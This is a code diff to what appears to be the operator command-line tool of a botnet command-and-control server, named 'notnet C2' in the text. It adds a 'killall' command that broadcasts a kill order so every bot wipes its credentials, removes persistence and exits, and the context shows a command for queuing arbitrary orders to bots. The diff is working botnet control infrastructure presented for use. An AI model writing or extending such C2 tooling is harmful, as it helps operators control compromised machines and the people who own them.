@@ -68,6 +68,15 @@ def cmd_queue(base, target, cmd, args):
           f"target={j.get('target') or 'any'}")
 
 
+def cmd_killall(base):
+    """Broadcast `kill` to every bot on every channel — the operator-side
+    global kill switch. Each bot self-destructs (wipe creds, stop
+    modules, remove persistence, exit). One-way; there is no undo."""
+    j = api(base, "/api/queue", method="POST",
+            body={"target": "", "cmd": "kill", "args": "", "broadcast": True})
+    print(f"broadcast kill queued id={j.get('id')} — every bot self-destructs")
+
+
 def main():
     ap = argparse.ArgumentParser(description="notnet C2 operator CLI")
     ap.add_argument("--api", default=os_env_api())
@@ -87,6 +96,9 @@ def main():
     p.add_argument("cmd")
     p.add_argument("args", nargs=argparse.REMAINDER, default=[])
     p.set_defaults(fn=cmd_queue)
+
+    p = sub.add_parser("killall")
+    p.set_defaults(fn=cmd_killall)
 
     args = ap.parse_args()
     if args.action == "queue":
